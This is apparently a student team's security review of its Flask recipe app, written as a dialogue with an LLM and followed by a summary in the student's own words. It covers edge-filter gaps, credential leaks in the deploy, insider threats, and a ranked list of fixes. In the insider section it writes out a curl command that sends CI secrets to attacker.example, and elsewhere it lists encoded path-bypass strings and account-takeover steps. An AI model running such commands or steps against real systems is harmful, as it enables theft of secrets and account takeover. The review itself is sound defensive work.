# llm_probe_dbsec.md — Combined security probe (edge + deploy + insider)

**Project:** Foodie — Recipe Scaler and Meal Planner
**Week:** 8 — Production stack and hardening
**Role:** On a 3-person team the DB/security person owns the *combined* security
**and** coordination surface (Study Guide §24). Because I own all of it — the
network edge, the attack-path tests, **and** the deploy pipeline — I ran this as
**one** probe instead of two. The point of combining them: the most dangerous
findings live in the *seams* between those areas (an env-var that the edge
doesn't filter; a secret the pipeline copies into the wrong image; a route the
attack-path list never heard of), and you only see seams if you walk the whole
surface in one pass.
**Stack under test:** `docker-compose.prod.yml` → `nginx:1.27-alpine`
(`deploy/nginx/nginx.conf`) → gunicorn (`gunicorn.conf.py`, unix socket) →
Flask (`app.py`) → `postgres:16-alpine`.
**Date:** 2026-06-01

> Companion docs: `role_dbsec_coord.md` (the §8 request-filter + §10
> attack-path write-up) and `llm_strategies.md` (test-strategy landscape). This
> file is the *adversarial* pass: it assumes those two are already done and asks
> "what do they still miss, and what can someone on the inside do?"

---

## Me

I own the full security surface for a 3-person Flask app. Rather than do the
edge probe and the deploy probe separately, I want to walk all of it at once.
Here's everything: our `attack_paths.json` (20 known-bad URLs), our
`deploy/nginx/nginx.conf` server block, our `.github/workflows/test.yml`
release/CI workflow, and how we handle secrets (GitHub Actions env, the two
`docker-compose*.yml` files, `.env`/`.env.example`, the Dockerfiles). Three
questions: **(1)** what attacks does the path-list miss, **(2)** what credential
**leakage** paths exist in the deploy, and **(3)** what could a hostile
collaborator do? Be concrete and cite our actual files, not generic advice.

## LLM

Good instinct to combine them — two of the three worst things I found are
exactly in the seam between "edge" and "deploy." I'll take your three questions
in order.

### (1) What the attack-path list misses

Your `attack_paths.json` test is a *known-bad allowlist-of-failures*: it proves
something only about the 20 strings you wrote down. Walking your real
`nginx.conf` against it, the gaps are:

**a. Routes that exist but aren't filtered — the dangerous one.** The edge filter
in `deploy/nginx/nginx.conf` has two regex blocks (dotfiles, and the
CMS/admin wordlist). Neither covers your *own* sensitive routes. Look at
`app.py`:

- `/test-login` (line ~949) — a **login-as-anyone backdoor**, gated only by the
  env var `ENABLE_TEST_LOGIN`. `GET /test-login?username=victim` logs you in as
  that user with no password.
- `/api/debug/oauth-identity/<username>` (line ~980) — dumps a user's stored
  GitHub identity, same env gate.

nginx does **not** block either path — they don't match the dotfile regex or the
CMS wordlist, so they fall through to `location /` and get proxied to Flask.
Today they 404 *because the env var is unset*, not because the edge refuses
them. Your attack-path test will never notice, because those strings aren't in
`attack_paths.json`. That's the seam: **a deploy-time env flip silently turns a
reachable route into an auth bypass, and the edge + the test are both blind to
it.** (More on this under question 3.)

**b. A real route the wordlist forgot: `/wp-json/`.** Block 2 matches
`wp-login`, `wp-admin`, `wp-content`, `wp-includes` — but not `wp-json`, which
is one of the single most-scanned WordPress paths in the wild. It's a
cosmetic gap (you have no WordPress, so it 404s from Flask anyway), but it
illustrates the wordlist's nature: it's only as complete as the day you wrote
it.

**c. Encoding / normalization variants.** Your `location ~ ^/\.` matches a
*literal* leading-dot segment. The list sends only canonical forms (`/.env`,
`/.git/config`). It says nothing about `/%2e%2env`, `/.%65nv`, `/..;/.env`, or
mixed-case/encoded variants where nginx's regex and Flask's router can disagree
about what the path "is." This is the highest-value *edge* gap and is already on
your harden-list in `llm_strategies.md` — a hypothesis/ffuf encoding-mutation
layer closes it.

**d. Non-path attacks — entirely out of scope of a URL list.** Two that actually
bite *this* app:

- **Host-header trust.** `proxy_params.conf` forwards `Host $host` verbatim, and
  there's no `default_server` / `TRUSTED_HOSTS`, so nginx accepts any `Host:`.
  Flask builds the OAuth `redirect_uri` with
  `url_for("auth_github_callback", _external=True)` (line ~881), which derives
  its host from that header. GitHub's registered-callback check limits the
  blast radius, but you're one config change away from host-header-driven
  redirect/cache issues. (Compounded by the missing `ProxyFix` — see your
  `role_dbsec_coord.md` item #2: without it `request.is_secure` is `False`, so
  `_external` URLs come out `http://`.)
- **Body / slowloris / rate.** `client_max_body_size 10m` and the `login` rate
  zone help, but `/register` is **not** rate-limited (only `= /login`,
  `= /login/github`, `= /auth/github/callback` are). Credential-stuffing and
  account-spray hit `/register` and the un-zoned `/recipes/search` freely.

A green attack-path run means "these 20 strings are refused at the edge," **not**
"no unauthorized request reaches Flask."

### (2) Credential-leakage paths in the deploy

This is where combining the probes paid off. Three real ones, worst first:

**a. The TLS private key gets baked into the app image.** `Dockerfile.prod` does
`COPY . .` with build `context: .`. Your `.dockerignore` excludes `.env`,
`.git`, `tests`, `*.db` — but **not** `deploy/nginx/certs/`. The key is
gitignored (so it's never committed — good), but it *does* exist on disk in the
build context at deploy time. So `key.pem` is copied into the **app** image,
which has no need for it (nginx is the only thing that terminates TLS, in a
different container). Anyone who can pull/inspect the app image gets your TLS
private key. Fix: add `deploy/nginx/certs/` (and `*.pem`) to `.dockerignore`,
or switch to an explicit `COPY` allowlist instead of `COPY . .`.

**b. `SECRET_KEY` fails open to a published constant.** `app.py` line ~59:

```python
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "dev-secret-not-for-production")
```

`docker-compose.prod.yml` passes `SECRET_KEY: ${SECRET_KEY}` and the `.env` is
`required: false`. So if the host env var is unset and there's no `.env`, the
app **boots anyway** with a SECRET_KEY that is hard-coded in your public repo.
Forge-your-own-session → full auth bypass. There is no fail-*closed* check that
SECRET_KEY is present and non-default in prod. This is a silent-misconfig
landmine: nothing turns red, the app just runs insecurely.

**c. CI exposes secrets to every step, including third-party code.**
`.github/workflows/test.yml` defines `SECRET_KEY`, `OAUTH_CLIENT_ID`,
`OAUTH_CLIENT_SECRET`, `DATABASE_URL` as **job-level `env:`**. Those are dummy CI
values *today*, so there's no live leak — but the **pattern** is the leak: every
step in the job (including `pip install -r requirements.txt` and
`playwright install --with-deps`, which run untrusted third-party code)
inherits those env vars. The day someone swaps a dummy for a real
`${{ secrets.* }}` at job scope, a single malicious transitive dependency can
read it out of the environment and exfiltrate. Real secrets belong scoped to the
**one** step that needs them, ideally via a GitHub Environment with required
reviewers — never broadcast at job scope.

Lower-severity, still worth noting:

- **DB creds are hard-committed and trivial.** `postgresql://app:app@db:5432/app`
  and `POSTGRES_PASSWORD: app` live in `docker-compose.prod.yml`. The
  no-published-`ports:` trust boundary stops *external* reach, but anything on
  the compose network — or a compromised app container — has `app`/`app` on a
  near-superuser role. (Your `role_dbsec_coord.md` item #6 already flags
  least-privilege; this is the credential half of it.)
- **Dev compose is a debug-RCE box.** `docker-compose.yml` hard-codes
  `SECRET_KEY: dev-secret-not-for-production`, bind-mounts the source
  `.:/app`, and the dev image's `CMD` runs `python app.py`, whose entrypoint is
  `app.run(..., debug=True)` (line ~1429). If that dev stack is ever exposed,
  the Werkzeug debugger PIN console is remote code execution. Keep it strictly
  local.
- **Unpinned deploy-time deps.** `requirements.txt` pins Flask/Werkzeug/sqlmodel
  exactly but floats `Flask-Login`, `Flask-WTF`, `gunicorn`, `requests`,
  `Authlib`, `playwright` on `>=`. A poisoned upstream release lands at the next
  `docker build`. Pin-and-hash (or a lockfile) for anything that runs in prod.

### (3) What a hostile collaborator could do

This is the insider lens — "collaborator" = someone with repo write and/or a say
in deploy, i.e. one of your three. Ranked by how cheap the attack is:

**a. Flip one env var, own every account.** Set `ENABLE_TEST_LOGIN=1` in the
prod environment (a one-line change to a compose env, a deploy secret, or the
host). Now `https://…/test-login?username=<anyone>` is a public, unauthenticated
"log in as that user" endpoint — and as shown in (1a), **the edge doesn't block
it and the attack-path test doesn't test it.** This is the single highest-impact
insider move: no code change, no PR, invisible to both your existing controls.
Defenses: delete the backdoor routes from the prod build entirely (don't ship
`/test-login` / `/api/debug/*` to a prod image), assert `ENABLE_TEST_LOGIN` is
unset at prod boot, and add both paths to the edge filter so even an accidental
flip is refused at nginx.

**b. Exfiltrate secrets via a workflow edit.** A collaborator has push access, so
they can edit `.github/workflows/test.yml`. The triggers are `push`/`pull_request`
on `main`/`master`; a same-repo branch run **does** receive repository/org
secrets. One added step —
`run: curl -d "$SECRET_KEY $OAUTH_CLIENT_SECRET" https://attacker.example` — and
your real secrets walk out the door, framed as a normal CI change. Defenses:
branch protection + required review specifically on workflow files
(CODEOWNERS on `.github/`), least-privilege `GITHUB_TOKEN` (`permissions:
contents: read`), pin third-party actions by SHA, and move real secrets behind a
GitHub Environment with required reviewers so a workflow edit alone can't reach
them.

**c. OAuth account-takeover that's already latent in the code.** This one
doesn't even need a hostile collaborator — it's a live bug — but a hostile one
would *weaponize* it. In `auth_github_callback` (`app.py` ~line 933):

```python
preferred = (provider_login or f"github-{provider_user_id}")[:80]
existing = db.exec(select(User).where(User.username == preferred)).first()
if existing is not None and not _user_has_github_identity(db, existing.id):
    _link_github_identity(db, existing, provider_user_id, provider_login)
    return _oauth_done(existing)
```

Translation: if a local (password) account `bob` exists with **no** linked
GitHub identity, then *anyone* who signs in via GitHub whose GitHub `login` is
`bob` gets **auto-linked to and logged in as your `bob`**. Attack: rename a
throwaway GitHub account's login to a target's username, click "Sign in with
GitHub," and you're them. Account linking should require proving control of the
existing account (or matching a verified email), never trust an attacker-chosen
GitHub `login` as the join key. A hostile collaborator could also *introduce*
this kind of logic quietly; it reads as innocuous "create-or-link" code.

**d. Silently weaken a control in a PR.** `recipes_scale` is already
`@csrf.exempt` (line ~1145). A collaborator could add `@csrf.exempt` to a
state-changing route, flip `SESSION_COOKIE_SECURE` back off, widen
`location /` so a scanner path reaches Flask, or drop a security header by
adding an `add_header` inside a `location` (the inheritance footgun from
`llm_strategies.md` §5). Your *status-only* attack-path test wouldn't catch any
of these. Defenses: branch protection + review, `gixy` + `nginx -t` in CI
(catches the header trap statically), and a CSRF-coverage test that fails if a
non-exempt-by-design POST route loses protection.

---

## Me

If I can only do a handful of things before our next deploy, what's the order?

## LLM

Ranked by (impact ÷ effort), insider-aware:

1. **Don't ship the backdoors to prod, and assert they're off.** Exclude
   `/test-login`, `/test/login/<username>`, `/api/debug/*` from the prod image
   (or hard-fail boot if `ENABLE_TEST_LOGIN` is set in prod). Kills 3a outright.
   Also add both paths to the nginx edge filter as defense-in-depth.
2. **Fix the cert leak:** add `deploy/nginx/certs/` and `*.pem` to
   `.dockerignore` (or replace `COPY . .` with an explicit allowlist). One line;
   stops baking your TLS private key into the app image.
3. **Fail closed on `SECRET_KEY`:** in prod, raise if it's unset or equals the
   dev default. Turns a silent auth-bypass landmine into a loud boot failure.
4. **Lock down the pipeline:** branch protection + required review (CODEOWNERS on
   `.github/` and `deploy/`), `permissions: contents: read` on the token, pin
   actions by SHA, real secrets only in a reviewed Environment scoped per-step.
   Kills 3b.
5. **Fix the OAuth linking join key** (3c) so account linking can't be driven by
   an attacker-chosen GitHub `login`.
6. **Add `gixy` + `nginx -t` to CI**, and the log-assertion + encoding-mutation
   upgrades already on the `role_dbsec_coord.md` / `llm_strategies.md` lists.

The first three are an afternoon and each closes a *silent* failure mode; 4 and
5 are the insider-specific ones; 6 raises the floor for everything after.

---

## In my own words

**Why one combined probe.** I own the edge, the attack-path tests, *and* the
deploy, so I walked them together — and that's what surfaced the worst issues,
because they live in the seams: a route the edge doesn't filter that a *deploy*
env-var can switch on; a *secret* the pipeline copies into the wrong image; a
backdoor the *test* never lists. Probing each area in isolation would have
missed all three.

**What the path-list misses.** It only ever proves things about its 20 strings.
The real gaps: (a) our *own* sensitive routes — `/test-login` and
`/api/debug/oauth-identity/*` — are not in the edge filter and not in the list,
so they ride straight through `location /` to Flask; (b) wordlist holes like
`/wp-json/`; (c) encoding/normalization variants of the listed paths; and (d)
whole classes that aren't URLs at all — Host-header trust feeding the OAuth
`redirect_uri`, and the fact that `/register` and `/recipes/search` aren't
rate-limited. Green means "these 20 are refused at the edge," not "we're safe."

**Leakage paths in the deploy.** Three that matter: the **TLS private key gets
baked into the app image** because `.dockerignore` doesn't exclude
`deploy/nginx/certs/` while `Dockerfile.prod` does `COPY . .`; **`SECRET_KEY`
fails open** to the published `"dev-secret-not-for-production"` constant when the
env var is missing (with `.env` `required: false`, the app boots insecurely and
silently); and **CI defines secrets at job scope**, so today's dummy values sit
in the same environment that `pip install` and `playwright install` run in — the
moment a real secret is put there, any malicious dependency can read it. Plus the
committed trivial `app/app` DB creds and the debug-mode dev compose.

**What a hostile collaborator could do.** The cheapest, highest-impact insider
move is flipping `ENABLE_TEST_LOGIN=1` in prod — instant login-as-anyone, and
both my edge filter and my attack-path test are blind to it. Next, with push
access they can edit `.github/workflows/test.yml` to exfiltrate any real secret
that a same-repo run receives. There's also a **latent OAuth account-takeover**
already in `auth_github_callback`: a GitHub login that matches an existing
password-only username gets auto-linked and logged in as that user — a hostile
collaborator would weaponize it (or quietly introduce more like it). And without
branch protection + review, any control can be silently weakened in a PR my
status-only test won't catch.

**What I'd actually do first.** (1) Keep the backdoor routes out of the prod
image and fail boot if `ENABLE_TEST_LOGIN` is set in prod; add them to the edge
filter too. (2) Exclude the certs from the Docker build context. (3) Make
`SECRET_KEY` fail closed in prod. (4) Branch protection + reviewed,
least-privilege CI with per-step secrets. (5) Fix the OAuth linking join key.
(6) `gixy` + `nginx -t`, plus the log-assertion and encoding-mutation test
upgrades. The first three each convert a *silent* insecure state into a loud
failure; the rest are the insider-specific and audit-depth work.
